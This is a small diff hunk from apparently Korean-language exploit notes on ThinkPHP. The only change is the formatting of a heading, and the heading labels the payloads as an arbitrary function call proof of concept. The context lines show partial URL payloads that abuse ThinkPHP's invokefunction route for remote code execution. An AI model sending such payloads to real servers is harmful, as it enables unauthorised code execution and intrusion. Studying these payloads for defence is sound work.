@@ -69,7 +69,7 @@ https://www.example.com/index.php?s\=/Index/\\think\\app/invokefunction&function
  
 <br>
 
-### 🐻‍❄️ 아래 페이로드도 `임의 함수 호출(POC)`
+### 🐻‍❄️ 아래 페이로드도 임의 함수 호출(POC)
 
 ```
 /?s=../\think\Container/invokefunction
